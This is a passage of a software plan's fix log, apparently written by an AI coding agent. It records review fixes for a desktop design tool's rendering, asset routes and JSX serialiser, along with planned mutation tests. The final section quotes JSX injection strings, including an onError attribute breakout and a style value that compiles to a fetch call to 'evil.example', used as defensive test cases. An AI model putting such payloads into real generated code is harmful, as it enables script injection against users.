| M20 | P5-S: `request_review` shows in the lens only, **no toast** and **no count** (review's "toast off by default" built as no toast: a default-off setting with no way to turn it on is the same thing, and adding one is one call where the lens receives a request). Task 28 gains a *No counts, no notification stream* paragraph (tabs and section titles carry names only; `tabular-nums` now names revisions, times and the capture progress, not "counts") and scroll anchoring for the newest-first feed: at the top, rows arrive; scrolled away, inserted rows are compensated before paint, a text-only *Jump to newest* appears, appends batch at ~10 Hz, and the offset survives lens visits in a module-level map (task 27's slice is unchanged). Two tests pin both: `Activity.test.tsx › anchored`, `DesignLens.test.tsx › noCounts`. The quoted rules were checked: `AGENTIC-UX.md:52` (§3 step 2), `:71` (§4 rule 4), `:78` (§4 rule 11); `DESIGN-SYSTEM.md:65`. Phase 2's only anchoring code is the xterm pane's (`attachRegistry.test.ts:334`), which a DOM list cannot reuse. | plan `:242` (P5-S); `task-28.md:68-76`, `:109-118`, `:135-136` |
| M14 | The dependency is added (the review's first option), with the second as the fallback: phase 4 plans both halves — task 16's `openPast(key)` sets `pastKey` and switches to Discover, task 19's `PastRevision` renders it read-only (`task-16.md:137`, `task-19.md:75` at `feat/phase-4-discover` `3bcc1b2`). *Open rev N* calls `openPast("brief:<id>@<N>")`; if task 19 is not in the tree when task 28 is built, the two buttons are not rendered and the report says so. A test pins the keys and that no client call is made. Restated in task 28's header, the task table, the sibling-plan rows and owner item 5. | `task-28.md:3`, `:30`, `:127`; plan `:217`, `:466`; `task-30.md:146-147` |

**Mutants an implementer should expect to survive (named first, per rule 7).** (1) In
`Activity.tsx`, compensating `scrollTop` one frame late (in a `requestAnimationFrame` after paint):
jsdom does not paint, so `anchored` stays green while the real webview flickers; only the owner's
eyes catch it (`OD-12`). (2) A count rendered as a word or inside an `aria-label` (*"three
requests"*): `noCounts` matches digits in `textContent`, so it survives; the paragraph forbids it and
the owner's visual pass is the check.

**Not done, and why.** Nothing was built or run; this batch changes plan text only. The phase 3
and phase 4 citations are at those branches' current heads (`a99d20b`, `3bcc1b2`), newer than the
`6c6b20f` and `64664b7` the older sibling-plan rows name; those rows were not re-checked here.

### Fix batch b08, round 2 (2026-09-24) — re-review `plan-rereview-b08-1.md`

Line numbers are the plan's and the parts' after this round's two commits.

| Finding | The change | Where |
|---|---|---|
| RR-b08-1 (I) | `anchored` asserts on `scrollTop`, which jsdom stores (`Element-impl.js:44`), not on `getBoundingClientRect()`, which jsdom zeroes (`:310-321`; both verified in `desktop/node_modules/jsdom`, and `desktop/vitest.config.ts:9` is `jsdom`). Scrolled to 200, three prepends → `200 + 3 × ACTIVITY_ROW_PX`. *No compensation at all* is named first in the mutant column. | `task-28.md:156` |
| RR-b08-2 (I) | The canvas-side option was chosen, not "rename them first". Renaming fixes only the test; the product would still name three agents alike in the one state where agents share a canvas before phase 3. Task 19's relay stamps `handleFor(s)`: the title, plus `" · " + s.ID` while another running or idle session on the same `(project, branch)` shares the title, computed per request. A new test covers it, including a duplicate that appears after dial. Owner item 3 starts the three with no title and checks for distinct handles, then renames one (`PATCH /v1/sessions/{id}`, `sessions.go:417`, verified). P5-L and goal 3 state the limit and the choice. `task-05.md`'s `Handle` comment matches. Verified: `sessions.go:560-563` (the default title); `ids.go:20-26` (`s-` + 8 hex). | `task-19.md:98-107`, `:140`; `task-30.md:143-148`; plan `:52`, `:236`; `task-05.md:70` |
| RR-b08-3 | The desktop never composes a brief key. Route 22's `ApprovalState` gains `headBriefKey`, which is `Briefs.Head(…).Key` verbatim, `""` when the head is unresolved. Approve step 3 already reads the same head. *Open rev 5* passes `latest.briefKey`; *Open rev 6* passes `headBriefKey`. The pre-approval chip reads it too (the chip's source was unstated before). With `""`, no chip renders: phase 4's *missing* means data loss (its `task-17.md:109` at `f772cf7`, verified). The test uses non-`brief:<id>@<N>` fixture keys and asserts identity. `selectDesignBriefKeys` feeds both keys to the loader. | `task-21.md:274-278`, `:389`; `task-27.md:143`, `:178`; `task-28.md:34`, `:100-104`, `:147`; plan `:216`, `:218` |
| RR-b08-4 | New seam **S5-P4.1**: `desktop/src/design/pastRevision.ts`'s `pastRevisionAvailable`. Whichever of task 28 and phase 4 task 19 lands second sets it `true`. `ApprovalBar.test.tsx › supersededNoPast` pins the fallback both ways. The sibling-plan paragraph now names `openPast` and `PastRevision`. Owner item 5 accepts "absent" only while the flag is `false`, and then reports the seam open. | plan `:521` (seam row), `:612`, `:218`; `task-28.md:18-21`, `:34`, `:148`; `task-30.md:152-155` |
| RR-b08-5 | The feed is task 26's fixed-row `virtualList` (`visibleRange`, now declared in task 26's contracts and exported from `src/index.ts`). Compensation is `k × ACTIVITY_ROW_PX` in a layout effect: arithmetic, because rows above a window are not mounted. Arrivals are called prepends. The visit state is `{anchorRowId, offset}`, restored by the anchor's index. The test adds two rows arriving while away and expects `(7 + 2) × 28 + 4`. | `task-28.md:72-88`, `:156`; `task-26.md:19`, `:30-32` |
| RR-b08-6 | `noCounts` exempts only the chip and the *rev N* node (`data-revision`), not the header. The paragraph says nothing else in the header carries a digit. The review's observation on *"Capturing 3 of 12"* is folded in: it is named as the human's own action's progress, with a defensible denominator (§4 rule 10, `AGENTIC-UX.md:77`, verified). | `task-28.md:130-131`, `:134-137`, `:157` |

**The two mutants expected to survive this round (named first, per rule 7), and the test text that now kills each.**

1. `handleFor` computed once at dial time. The first test started all three sessions before
   `Run`, so each dial already saw the others. Killed by the per-request clause in
   `TestSupervisor_duplicateTitleHandles` (`task-19.md:140`): a duplicate that starts after
   the dial, then exits.
2. `data-revision` put on the whole header, which restores the wholesale exemption. Killed by
   `noCounts` requiring exactly two such nodes, with the text of each pinned (`task-28.md:157`).

Round 1's survivor (1), compensation one frame late, still stands: `scrollTop` is read after the
batch flushes, so a `requestAnimationFrame` compensation can still pass under jsdom. The owner's
eyes remain the check (`OD-12`). Round 1's survivor (2), a count as a word, also stands.

**Not done, and why.** This round changes plan text only; nothing was built or run. Task 19's
hours (plan `:457`) are unchanged: `handleFor` is one function and one test. Unverified: whether
phase 4's provenance loader resolves a head key it did not itself produce. `selectDesignBriefKeys`
hands it one, as it already does for approval keys (S4-P5.1).

## Fix batch b09 (2026-09-24) — M10, M11, M12, M17

designapi and approval minors. Line numbers are the parts' after this batch's three commits (the
review's own locations predate batches b01–b08, so they had drifted: M11's `task-20.md:43-44` is
now routes 11–12 at `:100-101`, M12's `:37` is route 5 at `:94`).

| Finding | The change | Where |
|---|---|---|
| M17 | Renderer registrations are keyed by stream instance, as the review said. The broker mints `es-` + 12 hex per accepted `GET /v1/events`; the id is `<window>/<es>/<canvasId>:<visible\|hidden>`, so the old stream's close detaches only its own ids, and a stream holding both a visible and a hidden renderer for one canvas (task 27's `approving` case, a second collision the old id also had) registers two. The fix needed a wire path the plan lacked: route 19 had only `{requestId}` while `CompleteRender(rendererID, …)` (task 13) needs the renderer, so the `render` event now carries `"renderer"` and route 19 echoes it as `?renderer=` (missing → 400; another renderer's → 404 `render_not_found`). Task 27's `onRender`, `renderResult` and the adapter carry it; `setTopics` keeps "open new, then abort old" and says why it is now safe. Task 13 records the id as opaque, one per live registration. | `task-20.md:108`, `:156`, `:166-177`, `:321-322`; `task-27.md:50`, `:84-85`, `:90-93`, `:142-146`, `:182`; `task-13.md:125-128` |
| M11 | Route 11: `{sha}` is 64 lowercase hex and the body's SHA-256, hashed as it streams, must equal it, else `400 bad_request` `details.field: "sha"`, nothing stored or applied. Route 12 adds the Hub's `Content-Disposition: attachment; filename="<sha>"` and `Content-Security-Policy: sandbox; default-src 'none'` (verified at `hub-contract.md:854-857`, the Hub worktree). `fetch()` ignores both, so `assetBytes` → `blob:` is unchanged. | `task-20.md:100-101`, `:318-319` |
| M12 | Route 5 accepts exactly the editor's six kinds (`create_node`, `set_props`, `move`, `delete_node`, `set_token`, `delete_token`; the list at `task-23.md:153-157`, checked against the `ops.ts` builders at `:88-97` and task 29's paste, which sends `create_node`) as `humanOpKinds` in `ops.go`; any other → `400 bad_request` `details.field: "ops[<i>].kind"`, nothing applied. The paragraph names each refused kind's own route. The page kinds have no human UI in this phase, so they are refused too. Verified: sixteen `OpKind` constants at `task-06.md:28-45`. Task 23 notes the two lists move together. | `task-20.md:94`, `:111-123`, `:317`; `task-23.md:158-160` |
| M10 | `Snapshot.Blobs()` de-duplicates by digest (manifest included, sorted); route 21 step 6 uploads each distinct digest once and step 7 sends exactly those digests as `snapshot.blobs`. Verified that the Hub plan refuses a repeat: `400` `field: snapshot.blobs` (Hub plan `task-22.md:30`; the contract at `:886` requires distinct digests but names only `422 blob_missing`, corrected in round 2, RR-M10-1). **The second half of the review's fix was not taken as written**, on the facts: counting distinct digests for `MaxFiles` cannot run where re-review RR-I5-2 puts the check (step 4, before capture, when no PNG digest exists), and the handoff writes one file per manifest entry, so a digest count would let a manifest list any number of empty files under one digest. `MaxFiles` stays a **file** count, re-described as our own bound. Distinct digests never exceed files, so a snapshot within it is always within the Hub's 1–500. The cost: a canvas of more than 500 files, some of them duplicates, is refused locally (`413`, before capture), even when its distinct digests would fit the Hub. | `task-21.md:69-76`, `:102-109`, `:177-180`, `:352-360`, `:392-393` |

**The two mutants expected to survive (named first, per rule 7), and the test text that now kills
each.**

1. The adapter posts route 19 with the renderer id of the window's **current** stream, not the
   event's. With one stream the two are equal, so `renderRoundTrip` passed. A late event from the
   old stream would then be answered under the new id and get a `404`. Killed by its new clause:
   an event delivered on the old stream after the swap posts the old id (`task-27.md:182`).
2. Route 11 answers "already stored" for a known `{sha}` before hashing the body. The mismatch test
   used a digest nobody had stored, so it passed. Killed by `TestAssets_shaMismatch`'s second
   clause: the same mismatched POST after the named bytes are stored is still `400`
   (`task-20.md:319`).

**Not done, and why.** Only the plan text changed; nothing was built or run. The main plan's
diagram (`:86-88`) shows `render-results/{id}` and `PutBlob × n` in shorthand, which stays true, so
it was not edited. The handoff (task 22) still fetches one blob per file, and duplicates fetch the
same digest twice. That is correct but wasteful, and it is out of this batch's scope. Deferred as
a Minor.

## Fix batch b10 (2026-09-24) — M7, M16, M18, M21

Serialisation and dialect minors. Line numbers are the files' after this batch's commit; the
review's own locations predate b01–b09 (M7's `task-08.md:137` is now `:160`, M21's
`task-07.md:333-335` is now step 1 at `:472-483`).

| Finding | The change | Where |
|---|---|---|
| M7 | The mutant now reads: the six-character JSON escape (a backslash, then `u003c`) in place of each literal `<` in the vectors' `html`. **Root cause of the mangling, found while fixing it:** this session's Edit tool decodes a written backslash-u escape into the character, so the first attempt at the fix wrote the same unreadable `<` in place of `<` again. The escape was written through a script that builds the backslash with `chr(92)`, and its bytes were checked (`grep -c u003c` = 1). Anyone editing that line later needs the same care. | `task-08.md:160` |
| M16 | Text is split on `"\n"` (pieces joined by `<br />`); a piece holding any of `{ } < > " &` or a backslash is written as `{<CanonicalJSON(piece)>}`, task 08's encoder, so `"` becomes a backslash-quote and a backslash a double backslash; never built by concatenation. **One addition to the review's fix, on the facts:** `&` joins the set, because JSX decodes HTML entities in raw text, so `Tom &amp; Jerry` written raw would render `Tom & Jerry`. The test now covers the review's attack string, a backslash then a quote, the `&amp;` case, a raw piece, and a round trip (`json.Unmarshal` of each wrapped piece equals the source). | `task-09.md:49-57`; `:168` |
| M18 | **Recorded as the named v2 seam S5-F.1**, not built: font assets would touch the asset media types (task 05), the dialect (07), the renderer (24), the export (08, 21) and `get_font_info` (13), which is beyond a Minor. v1 is honest about the limit rather than hiding it. `get_font_info` already reports such a family `source: "missing"`. The `code-to-design` guide now tells the agent to check each family, keep the repository's stack in the token, and say so in the `request_review` `note`. The seam names what v2 extends (`Asset.MediaType`'s enum, the `source` union, the frame CSP's `font-src blob:`, all verified present) and what it must not do (take `@font-face` or a font `url()` in a style or token). The review's Hub claim was checked: `font/woff2` is at `hub-contract.md:850` in the Hub worktree (the review's `:841` had drifted). | plan `:62`, `:530`; `task-07.md:190-192`; `task-24.md:120-123`; `task-17.md:82` |
| M21 | Step 1 copies x/net v0.26.0's two lines verbatim from `control-plane/go.sum:133-134` into a new `canvas/go.sum` before `go mod tidy`. It forbids `GOSUMDB=off`, `GONOSUMDB` and `GOINSECURE` as a workaround, and it requires every line of `canvas/go.sum` to appear verbatim in `control-plane/go.sum`. It expects exactly the two lines: `control-plane`, which also requires x/net v0.26.0, records no `x/crypto v0.24.0` line though x/net's `go.mod` requires it, so the pruned graph reads no deeper `go.mod`. Verified on this device: `GOSUMDB=off` is already set, so the failure the review predicts would show only on a machine with the default. The module cache holds `x/net@v0.26.0` (`.mod`, `.zip`, `.ziphash`). G1 repeats the rule. Task 19's `go mod tidy` needs no change: its only new requirement is the canvas module through a local `replace`, which gets no `go.sum` line, and x/net's lines are already in `control-plane/go.sum`. | `task-07.md:472-483`; plan `:283-285` |

**The two mutants expected to survive (named first, per rule 7), and the test text that now kills
each.**

1. A JSX writer that escapes only the quote (`strings.ReplaceAll(piece, "\"", "\\\"")` inside
   `{"…"}`). It passes the review's attack string, so a test with only a quote would miss it. Text
   ending in a backslash then a quote would then close the string. Killed by the `a\"b` clause, which
   expects `{"a\\\"b"}` (`task-09.md:168`).
2. A writer that wraps on `{ } < > "` only and leaves `&` raw. Every other clause passes. Killed by
   the `Tom &amp; Jerry` clause (`task-09.md:168`).

**Not done, and why.** Only the plan text changed. Nothing was built or run, so the two mutants
above are specified, not executed. M21's "exactly two lines" is an expectation inferred from
`control-plane/go.sum`; nobody ran `go mod tidy` for `canvas/`, which does not exist yet. Custom
fonts stay a v2 seam (S5-F.1). Building them now needs an owner call only if a brand font is
required for the v1 demo.

### Fix batch b09, round 2 (2026-09-24) — re-review `plan-rereview-b09-1.md`

Commit `8107aac`, plus this section's own commit, which also states `DetachAll`'s lock boundary
(`task-13.md:137-141`, same lines). Line numbers are the parts' after both. All four issues were
fixed as the re-review said; one addition goes beyond it (the broker's `Source` gains `DetachAll`, because the
close order is otherwise unenforceable at the broker: its only detach handle was one func per id).

| Issue | The change | Where |
|---|---|---|
| RR-M17-1 (Important) | Task 13: among attached renderers of the preferred visibility, the **most recently attached** wins (an attach sequence, never slice, map or id order). New `DetachAll(ids)`: one critical section removes every listed registration, then fails their outstanding requests, so a re-send cannot land on the dying stream's sibling; a detach func is `DetachAll` of its own id. Task 20: the three swap orderings are rules (attach every renderer topic before flushing `200`; the desktop aborts the old stream only after the new `200`; a close is one `DetachAll`), and `Source` gains `DetachAll`. Task 27: `setTopics` states the order, keeps the old stream when the new request fails, and a newer `setTopics` aborts only the pending request. Task 21: the re-send cites task 13's two rules. | `task-13.md:130-141`, `:153-155`, `:210-211`; `task-20.md:185-194`, `:196`, `:222-224`, `:339`; `task-27.md:94-100`, `:180`; `task-21.md:326-330`, `:402` |
| RR-M17-2 (Minor) | The selection clears only when the canvas's **last** visible renderer detaches. `TestSelection_clearedOnDetach` has two visible renderers: the older one's detach keeps it, the last one's clears it, and an attached hidden renderer does not keep it. | `task-13.md:196-200`, `:223` |
| RR-M12-1 (Minor) | Route 5 checks each op's raw `kind` string against `humanOpKinds` before `doc` decodes the op, so an unknown name is route 5's own `400`. `TestOps_kindAllowlist` gains `kind: "bogus_kind"` → `400`, `details.field: "ops[0].kind"`, revision unchanged. That row kills a denylist of the ten refused kinds. | `task-20.md:116-119`, `:334` |
| RR-M10-1 (Minor) | The `400` `field: snapshot.blobs` is attributed to the Hub plan only (`task-22.md:30`). The contract (`hub-contract.md:885-886`) requires distinct digests and names only `422 blob_missing`. Both verified at Hub worktree HEAD `1e03ea3`. The `TestApprove_duplicateFiles` fake is described as the Hub plan's behaviour. This review's round-1 M10 row is corrected. The disagreement is recorded in this stream's ledger, addressed to the Hub stream, and in the batch report to the orchestrator. The Hub worktree is read-only here. Phase 5's code is unchanged. | `task-21.md:358-363`, `:397`; this file's M10 row in the b09 table |

**The two mutants expected to survive (named first, per rule 7), and the test text that now kills
each.**

1. The Service breaks a tie by the **largest renderer id**. The ids end in random `es-` hex, so
   the later stream's id sorts last about half the time, and a single-order test passes on those
   runs. Killed: `TestRender_prefersNewestOfEqualVisibility` runs each case twice, with the later
   id sorting first and then last (`task-13.md:210`).
2. The broker writes and flushes `200` **before** it attaches. A request sent right after the
   headers usually still finds B attached, because attaching is fast, so the overlap clause alone
   races. Killed: the test's `Source` holds B's `AttachRenderer` on a gate, and headers arriving
   while the gate is shut fail the test (`task-20.md:339`).

The other mutants the new text names:
- slice-order or first-attached tie-break (`:210`)
- per-id detach at close (`task-13.md:211`, `task-20.md:339`, `task-21.md:402`)
- aborting before the new `200`, or aborting after a `503` (`task-27.md:180`)
- clearing the selection on any visible detach (`task-13.md:223`)
- a route 5 denylist (`task-20.md:334`)

**Not done, and why.** This round changed plan text only; nothing was built or run. Deferred:
the re-review's two adjacent, pre-existing items, which were offered for a later batch and are
outside b09.
- `set_props` can point an image at an unregistered asset ref (`task-06.md:172`).
- Route 11 does not sanitise SVG, which `upload_asset` does (`task-16.md:86`).

`TestRender_detachAllBeforeFail` has the caller re-send from inside its error path, which
deadlocks if `DetachAll` fails the requests while holding the lock that `Render` takes. So the
comment at `task-13.md:137-141` states the lock boundary too: remove in one critical section,
release the lock, then fail the requests.

### Fix batch b10, round 2 (2026-09-24) — re-review `plan-rereview-b10-1.md`

Round 1's M7 and M18 were resolved and are untouched. Line numbers are the files' after this
commit.

| Issue | The change | Where |
|---|---|---|
| RR-M16-1 (Important) | `JSX` now states one rule for **every** string it writes, not only doc text. A JS string context (every inline style value) is always `CanonicalJSON(v)`, so the golden's `"390px"` is unchanged. A JSX context (a text piece, an attribute value, an SVG element's character data) is raw unless v holds a member of one shared set, `JSXTrigger`, and is then `{CanonicalJSON(v)}` as a child or `name={CanonicalJSON(v)}` as an attribute. The attributes are named: `alt`, `aria-label`, `placeholder`, `defaultValue`, `src`, `className` and every SVG attribute. An svg node's stored markup is decoded with `encoding/xml` before encoding, and each character-data run in `text`/`tspan`/`title`/`desc` is one child, never split on `<br />`. New test row `TestJSX_attrAndStyleEscapes` holds the three attack strings, the `"Geist Sans"` Tailwind case, an entity-shaped `alt`, a raw `alt`, and the decoded-vs-escaped SVG text, each round-tripped through `json.Unmarshal`. **Two additions to the re-review's fix, on the facts.** (1) The attribute set includes `&`, not just `" { }` and the backslash: TypeScript decodes `title="a &amp; b"` to `a & b`, so a raw `alt="Tom &amp; Jerry"` would render `Tom & Jerry`. (2) The set includes U+0000–U+001F, U+2028 and U+2029: TypeScript folds a raw CR in JSX text to a space (`a`CR`b` compiles to `"a b"`). The text pieces already split on `\n`, but a CR still got through. | `task-09.md:48-82`; `:195`; `:224-228` (Not claimed) |
| RR-M16-2 (Minor) | `TestJSX_textEscapes` gains one clause per `JSXTrigger` member, each piece holding that member alone: `{ } < > " &`, the backslash (`a\b` → `{"a\\b"}`), CR and U+2028. Dropping any one member from the set now fails a clause. | `task-09.md:194` |
| RR-M21-1 (Minor) | Step 1 no longer states the sumdb failure as fact. It now says tidy **may** need the checksum database when the sumdb lookup cache lacks `x/net@v0.26.0`, and that copying the two lines removes that dependence. It cites the re-review's experiment: rc=0 and exactly the two lines with the lines copied; also rc=0 with no `go.sum`, from the cached lookup. The untested case (an empty sumdb cache) is named. G1 (plan `:283-285`) already reads "no checksum-database lookup is needed", which agrees, so it is unchanged. **This supersedes round 1's M21 row and "Not done" paragraph above**, which say the failure "would show only on a machine with the default" and that nobody ran tidy. | `task-07.md:474-480` |

**Evidence, run on this device during this fix:** a scratch script (`scratchpad/p5/rr10b/jsx.cjs`,
not the worktree) put each case through TypeScript 6.0.3's `transpileModule` (`jsx: react`), from
the main tree's `desktop/node_modules`, read-only. Results:

- The naive sinks become code. `alt="x" onError={() => fetch(1)} y=""` compiles to an `onError`
  prop. The naive style value compiles to `"a" + fetch('//evil.example') + "b"`. `<text>{fetch(1)}</text>`
  compiles to a `fetch(1)` child. `className="[font-family:"Geist_Sans",sans-serif]"` gives
  "Identifier expected".
- Each wrapped form compiles clean to one string.
- A raw `>` and a raw `}` in text are errors. A raw backslash is literal. A raw tab is kept.
- `scratchpad/p5/rr10b/main.go` (Go, `SetEscapeHTML(false)`, trailing newline trimmed) printed
  every expected encoding in the two test rows, and each round-tripped through `json.Unmarshal`.
  U+2028 comes out as its six-character escape.

**The two mutants expected to survive (named first, per rule 7), and the text that kills each.**

1. A per-sink trigger set: attributes wrapped only when v holds `"`. That set passes the `alt`
   attack and the Geist case, since both hold a quote. It is killed by the `alt` of
   `Tom &amp; Jerry`, which expects `alt={"Tom &amp; Jerry"}` (`task-09.md:195`).
2. SVG character data encoded from the stored markup's escaped bytes, not from the decoded text.
   It passes `{fetch(1)}`, which holds no entity. It is killed by `<text>{"a & b"}</text>`, where
   the mutant writes `{"a &amp; b"}` (`task-09.md:195`).

**Not done, and why.** Only the plan text changed, and no `jsx.go` exists, so neither mutant was
executed. Whether task 07 really keeps the style payload `a" + fetch('//evil.example') + "b` is
reasoned from its tokenizer text (`task-07.md:134-139`: the payload's middle is one CSS string
token), not run. The writer test does not depend on it: its doc is built through `Apply` with a
permissive fake `Checker`, task 08's fixture route (`task-08.md:170`). A raw
U+2028 in JSX text was not put through TypeScript.
